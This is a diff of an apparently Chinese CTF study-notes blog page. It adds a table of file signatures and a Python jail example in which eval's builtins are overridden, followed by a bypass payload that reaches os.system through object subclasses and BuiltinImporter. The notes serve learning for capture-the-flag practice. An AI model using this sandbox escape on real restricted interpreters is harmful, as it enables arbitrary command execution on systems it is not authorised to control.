@@ -311,7 +311,7 @@
 
 
                 <time class="article-time--reading">
-                    阅读时长: 6 分钟
+                    阅读时长: 7 分钟
                 </time>
                 <svg xmlns="http://www.w3.org/2000/svg" class="icon icon-tabler icon-tabler-copyright" width="24" height="24" viewBox="0 0 24 24" stroke-width="2" stroke="currentColor" fill="none" stroke-linecap="round" stroke-linejoin="round">
   <path stroke="none" d="M0 0h24v24H0z"/>
@@ -322,7 +322,7 @@
 
 
                 <time class="article-words">
-                    2824 字
+                    3134 字
                 </time>
             </div>
         
@@ -413,6 +413,63 @@
 </span></span></code></pre></td></tr></table>
 </div>
 </div><h2 id="基础知识">基础知识</h2>
+<p><strong>常见文件头</strong></p>
+<div class="table-wrapper"><table>
+<thead>
+<tr>
+<th>格式</th>
+<th>文件头</th>
+<th>文件尾</th>
+</tr>
+</thead>
+<tbody>
+<tr>
+<td>ZIP(zip)</td>
+<td>50 4B 03 04</td>
+<td>50 4B</td>
+</tr>
+<tr>
+<td>RAR(rar)</td>
+<td>52 61 72 21</td>
+<td></td>
+</tr>
+<tr>
+<td>JPEG(jpg)</td>
+<td>FF D8 FF</td>
+<td>FF D9</td>
+</tr>
+<tr>
+<td>PNG(png)</td>
+<td>89 50 4E 47</td>
+<td>AE 42 60 82</td>
+</tr>
+<tr>
+<td>GIF(gif)</td>
+<td>47 49 46 38</td>
+<td>00 3B</td>
+</tr>
+<tr>
+<td>TIFF(tif)</td>
+<td>49 49 2A 00</td>
+<td></td>
+</tr>
+<tr>
+<td>Windows Bitmap(bmp)</td>
+<td>42 4D AE 0A 0B</td>
+<td></td>
+</tr>
+<tr>
+<td>7-ZIP(7z)</td>
+<td>37 7A BC AF 27 1C</td>
+<td></td>
+</tr>
+<tr>
+<td>avi(RIFF)</td>
+<td>52 49 46 46</td>
+<td></td>
+</tr>
+</tbody>
+</table></div>
 <h3 id="音频">音频</h3>
 <p>wav文件头：<code>52494646E6AD250357415645666D7420</code></p>
 <p>工具: <code>Audacity</code></p>
@@ -871,6 +928,45 @@
 </span></span><span class="line"><span class="cl"><span class="nb">eval</span><span class="p">(</span><span class="nb">input</span><span class="p">())</span> <span class="c1"># 使用该命令绕过初始限制</span>
 </span></span></code></pre></td></tr></table>
 </div>
+</div><p><strong>重写<code>eval</code>屏蔽</strong></p>
+<div class="highlight"><div class="chroma">
+<table class="lntable"><tr><td class="lntd">
+<pre tabindex="0" class="chroma"><code><span class="lnt">1
+</span><span class="lnt">2
+</span><span class="lnt">3
+</span></code></pre></td>
+<td class="lntd">
+<pre tabindex="0" class="chroma"><code class="language-python" data-lang="python"><span class="line"><span class="cl"><span class="nb">eval</span><span class="p">(</span><span class="n">code</span><span class="p">,</span> <span class="p">{</span><span class="s2">&#34;__builtins__&#34;</span><span class="p">:</span> <span class="p">{</span><span class="s2">&#34;eval&#34;</span><span class="p">:</span> <span class="k">lambda</span> <span class="o">*</span><span class="n">x</span><span class="p">:</span> <span class="nb">print</span><span class="p">(</span><span class="s2">&#34;sry, no eval for u&#34;</span><span class="p">)}},</span> <span class="p">{})</span>
+</span></span><span class="line"><span class="cl"><span class="c1"># eval(code, globals, locals): globals 和 locals 定义了全局和局部命名空间</span>
+</span></span><span class="line"><span class="cl"><span class="c1"># {&#34;__builtins__&#34;: {&#34;eval&#34;: lambda *x: print(&#34;sry, no eval for u&#34;)}} 作为全局重写为无论输入什么都只打印</span>
+</span></span></code></pre></td></tr></table>
+</div>
+</div><div class="highlight"><div class="chroma">
+<table class="lntable"><tr><td class="lntd">
+<pre tabindex="0" class="chroma"><code><span class="lnt"> 1
+</span><span class="lnt"> 2
+</span><span class="lnt"> 3
+</span><span class="lnt"> 4
+</span><span class="lnt"> 5
+</span><span class="lnt"> 6
+</span><span class="lnt"> 7
+</span><span class="lnt"> 8
+</span><span class="lnt"> 9
+</span><span class="lnt">10
+</span></code></pre></td>
+<td class="lntd">
+<pre tabindex="0" class="chroma"><code class="language-bash" data-lang="bash"><span class="line"><span class="cl"><span class="c1"># 绕过</span>
+</span></span><span class="line"><span class="cl"><span class="o">[</span>klass <span class="k">for</span> klass in <span class="s2">&#34;&#34;</span>.__class__.__base__.__subclasses__<span class="o">()</span> <span class="k">if</span> klass.__name__ <span class="o">==</span> <span class="s2">&#34;BuiltinImporter&#34;</span><span class="o">][</span>0<span class="o">]</span>.load_module<span class="o">(</span><span class="s2">&#34;builtins&#34;</span><span class="o">)</span>.__import__<span class="o">(</span><span class="s2">&#34;os&#34;</span><span class="o">)</span>.system<span class="o">(</span><span class="s2">&#34;ls&#34;</span><span class="o">)</span>
+</span></span><span class="line"><span class="cl">
+</span></span><span class="line"><span class="cl"><span class="c1"># &#34;&#34;.__class__: 获取&lt;class &#39;str&#39;&gt;</span>
+</span></span><span class="line"><span class="cl"><span class="c1"># .__base__: 获取基类&lt;class &#39;object&#39;&gt;</span>
+</span></span><span class="line"><span class="cl"><span class="c1"># .__subclasses__(): 返回object类所有子类列表</span>
+</span></span><span class="line"><span class="cl"><span class="c1"># 列表推导式筛选出BuiltinImporter的类——用于导入内置模块</span>
+</span></span><span class="line"><span class="cl"><span class="c1"># [0]取出第一个元素BuiltinImporter类</span>
+</span></span><span class="line"><span class="cl"><span class="c1"># .load_module(&#34;builtins&#34;): 加载builtins模块，包含python所有内置对象和函数</span>
+</span></span><span class="line"><span class="cl"><span class="c1"># .__import__(&#34;os&#34;).system(&#34;ls&#34;) # 执行命令</span>
+</span></span></code></pre></td></tr></table>
+</div>
 </div><h2 id="密码">密码</h2>
 <p><strong>凯撒密码</strong></p>
 <div class="highlight"><div class="chroma">
@@ -960,6 +1056,25 @@
             
                 
 <article class="has-image">
+    <a href="/zh-cn/p/ai%E7%AC%94%E8%AE%B0/">
+        
+        
+            <div class="article-image">
+                
+                    <img src="/img/note.jpg" loading="lazy" data-key="" data-hash="/img/note.jpg"/>
+                
+            </div>
+        
+
+        <div class="article-details">
+            <h2 class="article-title">AI笔记</h2>
+        </div>
+    </a>
+</article>
+
+            
+                
+<article class="has-image">
     <a href="/zh-cn/p/fuzzing%E7%AC%94%E8%AE%B0/">
         
         
@@ -1029,25 +1144,6 @@
 
         <div class="article-details">
             <h2 class="article-title">REVERSE笔记</h2>
-        </div>
-    </a>
-</article>
-
-            
-                
-<article class="has-image">
-    <a href="/zh-cn/p/web%E7%AC%94%E8%AE%B0/">
-        
-        
-            <div class="article-image">
-                
-                    <img src="/img/note.jpg" loading="lazy" data-key="" data-hash="/img/note.jpg"/>
-                
-            </div>
-        
-
-        <div class="article-details">
-            <h2 class="article-title">WEB笔记</h2>
         </div>
     </a>
 </article>
@@ -1124,7 +1220,7 @@
         
             
         
-        共 95.61k 字 · 共 12篇文章
+        共 97.05k 字 · 共 12篇文章
         <script async src="//busuanzi.ibruce.info/busuanzi/2.3/busuanzi.pure.mini.js"></script>
 
         <br />本站访客数<span id="busuanzi_value_site_uv"></span>人次---
